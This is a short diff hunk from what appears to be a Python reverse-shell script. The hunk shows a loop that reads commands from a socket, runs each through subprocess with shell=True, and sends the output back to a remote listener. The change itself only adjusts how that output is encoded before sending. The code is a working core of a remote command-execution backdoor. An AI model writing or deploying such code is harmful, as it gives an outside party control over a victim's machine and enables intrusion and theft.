@@ -15,7 +15,7 @@ while 1: # Start loop.
     # Run shell command.
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
     stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-    s.send(bytes(stdout_value, "UTF-8")) # Send output to listener.
+    s.send(bytes(stdout_value)) # Send output to listener.
     if data == "quit": 
         break # If its quit, then break out and close socket.
 s.close() # Close socket.
